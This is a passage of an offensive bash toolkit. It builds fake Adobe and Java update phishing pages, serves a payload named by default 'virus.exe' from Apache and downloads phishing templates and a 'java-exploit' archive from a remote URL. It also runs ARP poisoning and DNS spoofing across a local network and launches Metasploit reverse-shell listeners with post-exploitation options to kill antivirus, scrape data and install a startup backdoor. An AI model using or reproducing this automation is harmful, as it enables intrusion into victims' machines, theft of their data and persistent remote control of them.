pass2=$(zenity --list --title "POST EXPLOITATION" --text "\nDefault  :  dont migrate to system\nmigrate  :  migrate to -> $mig\nkillav  :  stop Anti-Virus process\nscraper  :  enumerate about everything\npersistence  :  start the backdoor in startup\nPost-auto.rc  :  run a list of post modules\n\nIf you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "migrate" FALSE "killav" FALSE "scraper" FALSE "persistence" FALSE "Post-auto.rc" --width 350 --height 434) > /dev/null 2>&1


      if [ "$pass2" = "migrate" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript migrate -n $mig; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         rm -r $apache/Fake_Update.aspx_files > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


      elif [ "$pass2" = "killav" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript killav; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         rm -r $apache/Fake_Update.aspx_files > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


      elif [ "$pass2" = "scraper" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript scraper; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         rm -r $apache/Fake_Update.aspx_files > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


      elif [ "$pass2" = "persistence" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript persistence -U -i 5 -p 8080 -r $lhost; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         rm -r $apache/Fake_Update.aspx_files > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         # persistence listenner
         sh_perlis5


      elif [ "$pass2" = "Default listenner" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         rm -r $apache/Fake_Update.aspx_files > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


      elif [ "$pass2" = "Post-auto.rc" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ loading resource ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         rm -r $apache/Fake_Update.aspx_files > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


else


    # CANCEL BUTTON PRESS QUITTING
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    # clean everything up
    /etc/init.d/apache2 stop
    rm $apache/$name > /dev/null 2>&1
    rm $apache/index.html > /dev/null 2>&1
    rm -r $apache/Fake_Update.aspx_files > /dev/null 2>&1
    rm -r $tWd > /dev/null 2>&1
    cd $H0m3/opensource
    sleep 2
    clear
fi
}








#
# Adobe Fake Update phishing webpage 'host a file attack'
#
sh_bp () {
Colors;

 # remove old payload from cache
 rm -r $tWd > /dev/null 2>&1

      # get user input
      echo ${BlueF}[*]${RedF}:${YellowF}[input payload settings]${Reset};
      fthost=$(zenity --title "HOST A FILE" --text "Chose the file to be hosted in apache webserver" --filename=$H0m3/opensource/priv8 --file-selection) > /dev/null 2>&1
      name=$(zenity --title="Name your payload" --text "virus.exe" --entry --width 350) > /dev/null 2>&1
      lhost=$(zenity --title="Input LHOST of [ $name ]" --text "\nexample: $IP\n" --entry --width 350) > /dev/null 2>&1
      lport=$(zenity --title="Input LPORT of [ $name ]" --text "\nexample: 4444\n" --entry --width 350) > /dev/null 2>&1

         # CHOSE WHAT PAYLOAD TO USE
         payload=$(zenity --list --title "PAYLOAD USED BY [ $name ]" --text "\nchose the correspondent payload\nused by the hosted file:$name\n" --radiolist --column "Pick" --column "Option" TRUE "generic/shell_reverse_tcp" FALSE "windows/shell_bind_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_http" FALSE "java/meterpreter/reverse_tcp" FALSE "osx/x86/isight/bind_tcp" FALSE "osx/ppc/shell/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" FALSE "php/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_tcp" --width 350 --height 373) > /dev/null 2>&1


       # BUIDING WEBPAGE
       html=$(zenity --title="BUILDING PHISHING WEBPAGE" --text "write a brief description\nabout the update provided." --entry --width 600) > /dev/null 2>&1


clear
cat << !

     [SETTING ARP POISON ATTACK]:
     ----------------------------
     leave blank to poison all local network
     (This will affect all devices inside local lan)

     or chose the modem/router ip address (route -n)
     and the target ip address as well.

!

      echo ${BlueF}[*]${RedF}:${BlueF}[setting ARP poison]: ${Reset};
      echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
      read router
      echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
      read target


         # download AdobeFake.tag.gz from repository
         mkdir $tWd
         cd $tWd
         echo ${BlueF}[*]${RedF}:${BlueF}[Downloading]${RedF}:${GreenF}[ AdobeFake.tar.gz ]${Reset};
         wget -qq https://dl.dropboxusercontent.com/u/21426454/netool-kali/AdobeFake.tar.gz | zenity --progress --pulsate --title "DOWNLOADING" --text="FILE: AdobeFake.tar.gz" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
         tar -xf AdobeFake.tar.gz
         echo ""

         # replace strings in index.html using SED command
         sed "s/Payl04D/$name/g" AdobeFake.html > copy.html
         sed "s/T3xt/$html/g" copy.html > copy2.html
         mv copy2.html index.html
         rm -f copy.html


           # copy files to apache webroot directory
           cp index.html $apache/index.html
           cp flash_windows.gif $apache/flash_windows.gif
           cp -r index_files $apache/index_files
           cp $fthost $apache/$name
           cd $apache
           chown $user $name
           chown $user index_files
           chmod +x $name

clear
cat << !

     [Host a file] Final Config:
     ===========================
     LHOST            : $lhost
     LPORT            : $lport
     FILENAME         : $name
     STORAGE IN       : $apache/$name
     PAYLOAD          : $payload

!

         # pre-load phishing webpage
         su $user xdg-open "index.html" > /dev/null 2>&1
         QuE=$(zenity --question --title "PRE-LOADING PHISHING WEBPAGE" --text "does the webpage displays correct?\nclose pre-load webpage and chose to continue or return to main menu" --width 350) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
         echo "good" > /dev/null 2>&1
         else
         echo ${BlueF}[*]${RedF}:${BlueF}[return to main menu]${RedF}:${GreenF}[ OK ]${Reset};
         sleep 2 && sh_exit # return to main menu
         fi

      sleep 2
      # start apache webserver + arp poison + metasploit listenner
      xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
      echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
      read op
      xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"


       if [ "$payload" "=" "windows/meterpreter/reverse_tcp" ]; then
         # jump to windows post-exloitation module
         sh_p0st2


           elif [ "$payload" "=" "windows/meterpreter/reverse_http" ]; then
           # jump to post-exloitation module
           sh_p0st2


           elif [ "$payload" "=" "windows/meterpreter/reverse_https" ]; then
           # jump to post-exloitation module
           sh_p0st2

       else

         # if not windows than lunch post-exploitation
         # for unix systems (post-auto.rc)
         sh_P0stEALL
fi
}


sh_p0st2 () {
Colors;

# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
pass2=$(zenity --list --title "POST EXPLOITATION" --text "\nDefault  :  dont migrate to system\nmigrate  :  migrate to -> $mig\nkillav  :  stop Anti-Virus process\nscraper  :  enumerate about everything\npersistence  :  start the backdoor in startup\nPost-auto.rc  :  run a list of post modules\n\nIf you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "migrate" FALSE "killav" FALSE "scraper" FALSE "persistence" FALSE "Post-auto.rc" --width 350 --height 434) > /dev/null 2>&1


      if [ "$pass2" = "migrate" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript migrate -n $mig; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/index_files > /dev/null 2>&1
         rm $apache/flash_windows.gif > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


      elif [ "$pass2" = "killav" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript killav; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/index_files > /dev/null 2>&1
         rm $apache/flash_windows.gif > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


      elif [ "$pass2" = "scraper" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript scraper; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/index_files > /dev/null 2>&1
         rm $apache/flash_windows.gif > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


      elif [ "$pass2" = "persistence" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript persistence -U -i 5 -p 8080 -r $lhost; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/index_files > /dev/null 2>&1
         rm $apache/flash_windows.gif > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         # persistence listenner
         sh_perlis5


      elif [ "$pass2" = "Default listenner" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/index_files > /dev/null 2>&1
         rm $apache/flash_windows.gif > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


      elif [ "$pass2" = "Post-auto.rc" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ loading resource ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm $apache/$name > /dev/null 2>&1
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/index_files > /dev/null 2>&1
         rm $apache/flash_windows.gif > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


else


    # CANCEL BUTTON PRESS QUITTING
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    # clean everything up
    /etc/init.d/apache2 stop
    rm $apache/$name > /dev/null 2>&1
    rm -r $tWd > /dev/null 2>&1
    rm -r $apache/index_files > /dev/null 2>&1
    rm $apache/flash_windows.gif > /dev/null 2>&1
    rm $apache/index.html > /dev/null 2>&1
    cd $H0m3/opensource
    sleep 2
    clear
fi
}








#
# java Fake Update phishing webpage 'host a file attack'
#
sh_javac () {
Colors;

 # remove old payload from cache
 rm -r $tWd > /dev/null 2>&1

      # get user input
      echo ${BlueF}[*]${RedF}:${YellowF}[input payload settings]${Reset};
      fthost=$(zenity --title "HOST A FILE" --text "Chose the file to be hosted in apache webserver" --filename=$H0m3/opensource/priv8 --file-selection) > /dev/null 2>&1
      name=$(zenity --title="Name your payload" --text "virus.exe" --entry --width 350) > /dev/null 2>&1
      lhost=$(zenity --title="Input LHOST of [ $name ]" --text "\nexample: $IP\n" --entry --width 350) > /dev/null 2>&1
      lport=$(zenity --title="Input LPORT of [ $name ]" --text "\nexample: 4444\n" --entry --width 350) > /dev/null 2>&1

         # CHOSE WHAT PAYLOAD TO USE
         payload=$(zenity --list --title "PAYLOAD USED BY [ $name ]" --text "\nchose the correspondent payload\nused by the hosted file:$name\n" --radiolist --column "Pick" --column "Option" TRUE "generic/shell_reverse_tcp" FALSE "windows/shell_bind_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_http" FALSE "java/meterpreter/reverse_tcp" FALSE "osx/x86/isight/bind_tcp" FALSE "osx/ppc/shell/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" FALSE "php/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_tcp" --width 350 --height 373) > /dev/null 2>&1


clear
cat << !

     [SETTING ARP POISON ATTACK]:
     ----------------------------
     leave blank to poison all local network
     (This will affect all devices inside local lan)

     or chose the modem/router ip address (route -n)
     and the target ip address as well.

!

      echo ${BlueF}[*]${RedF}:${BlueF}[setting ARP poison]: ${Reset};
      echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
      read router
      echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
      read target


         # download java-exploit.tar.gz from repository
         mkdir $tWd
         cd $tWd
         echo ${BlueF}[*]${RedF}:${BlueF}[Download]${RedF}:${GreenF}[ java-exploit.tar.gz ]${Reset};
         wget -qq https://dl.dropboxusercontent.com/u/21426454/netool-kali/java-exploit.tar.gz | zenity --progress --pulsate --title "DOWNLOADING" --text="FILE: java-exploit.tar.gz" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
         tar -xf java-exploit.tar.gz
         echo ""

         # replace strings in index.html using SED command
         cd java-exploit
         sed "s/Payl04D/$name/g" index-jar.html > index.html
         sed "s/java SDK 8.2.202.400/$name/g" copy.nt > index.html
         rm -f index-jar.html

           # copy files to apache webroot directory
           cp -r index_files $apache/index_files
           cp index.html $apache/index.html
           cp jv0h.jpg $apache/jv0h.jpg
           cp softdown.png $apache/softdown.png
           cp metrics_group1.js $apache/metrics_group1.js
           cp jv0_search_btn.gif $apache/jv0_search_btn.gif
           cp popUp.js $apache/popUp.js
           cp print.css $apache/print.css
           cp s_code_remote.js $apache/s_code_remote.js
           cp screen.css $apache/screen.css
           cp $fthost $apache/$name
           cd $apache
           chown $user $name
           chmod +x $name

clear
cat << !

     [Host a file] Final Config:
     ===========================
     LHOST            : $lhost
     LPORT            : $lport
     FILENAME         : $name
     STORAGE IN       : $apache/$name
     PAYLOAD          : $payload

!

         # pre-load phishing webpage
         su $user xdg-open "index.html" > /dev/null 2>&1
         QuE=$(zenity --question --title "PRE-LOADING PHISHING WEBPAGE" --text "does the webpage displays correct?\nclose pre-load webpage and chose to continue or return to main menu" --width 350) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
         echo "good" > /dev/null 2>&1
         else
         echo ${BlueF}[*]${RedF}:${BlueF}[return to main menu]${RedF}:${GreenF}[ OK ]${Reset};
         sleep 2 && sh_exit # return to main menu
         fi


      sleep 2
      # start apache webserver + arp poison
      xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
      echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
      read op
      xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"


       if [ "$payload" "=" "windows/meterpreter/reverse_tcp" ]; then
         # jump to windows post-exloitation module
         sh_p0st3


           elif [ "$payload" "=" "windows/meterpreter/reverse_http" ]; then
           # jump to post-exloitation module
           sh_p0st3


           elif [ "$payload" "=" "windows/meterpreter/reverse_https" ]; then
           # jump to post-exloitation module
           sh_p0st3

       else

         # if not windows than lunch post-exploitation
         # for unix systems (post-auto.rc)
         sh_P0stEALL
fi
}


sh_p0st3 () {
Colors;

# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
pass2=$(zenity --list --title "POST EXPLOITATION" --text "\nDefault  :  dont migrate to system\nmigrate  :  migrate to -> $mig\nkillav  :  stop Anti-Virus process\nscraper  :  enumerate about everything\npersistence  :  start the backdoor in startup\nPost-auto.rc  :  run a list of post modules\n\nIf you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "migrate" FALSE "killav" FALSE "scraper" FALSE "persistence" FALSE "Post-auto.rc" --width 350 --height 434) > /dev/null 2>&1


      if [ "$pass2" = "migrate" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript migrate -n $mig; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/index_files > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         rm $apache/jv0h.jpg > /dev/null 2>&1
         rm $apache/softdown.png > /dev/null 2>&1
         rm $apache/metrics_group1.js > /dev/null 2>&1
         rm $apache/jv0_search_btn.gif > /dev/null 2>&1
         rm $apache/popUp.js > /dev/null 2>&1
         rm $apache/print.css > /dev/null 2>&1
         rm $apache/s_code_remote.js > /dev/null 2>&1
         rm $apache/screen.css > /dev/null 2>&1
         rm $apache/$name > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


      elif [ "$pass2" = "killav" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript killav; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/index_files > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         rm $apache/jv0h.jpg > /dev/null 2>&1
         rm $apache/softdown.png > /dev/null 2>&1
         rm $apache/metrics_group1.js > /dev/null 2>&1
         rm $apache/jv0_search_btn.gif > /dev/null 2>&1
         rm $apache/popUp.js > /dev/null 2>&1
         rm $apache/print.css > /dev/null 2>&1
         rm $apache/s_code_remote.js > /dev/null 2>&1
         rm $apache/screen.css > /dev/null 2>&1
         rm $apache/$name > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


      elif [ "$pass2" = "scraper" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript scraper; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/index_files > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         rm $apache/jv0h.jpg > /dev/null 2>&1
         rm $apache/softdown.png > /dev/null 2>&1
         rm $apache/metrics_group1.js > /dev/null 2>&1
         rm $apache/jv0_search_btn.gif > /dev/null 2>&1
         rm $apache/popUp.js > /dev/null 2>&1
         rm $apache/print.css > /dev/null 2>&1
         rm $apache/s_code_remote.js > /dev/null 2>&1
         rm $apache/screen.css > /dev/null 2>&1
         rm $apache/$name > /dev/null 2>&1
         sh_rcfile # build resource file (latest listenner settings)


      elif [ "$pass2" = "persistence" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: Host a file attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set AutoRunScript persistence -U -i 5 -p 8080 -r $lhost; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$target/

         # clean everything up
         /etc/init.d/apache2 stop
         rm -r $tWd > /dev/null 2>&1
         rm -r $apache/index_files > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         rm $apache/jv0h.jpg > /dev/null 2>&1
         rm $apache/softdown.png > /dev/null 2>&1
         rm $apache/metrics_group1.js > /dev/null 2>&1
         rm $apache/jv0_search_btn.gif > /dev/null 2>&1
         rm $apache/popUp.js > /dev/null 2>&1
         rm $apache/print.css > /dev/null 2>&1
         rm $apache/s_code_remote.js > /dev/null 2>&1
         rm $apache/screen.css > /dev/null 2>&1
         rm $apache/$name > /dev/null 2>&1
         # persistence listenner
         sh_perlis5


      elif [ "$pass2" = "Default listenner" ]; then
      # starting a metasploit listenner (windows x86)
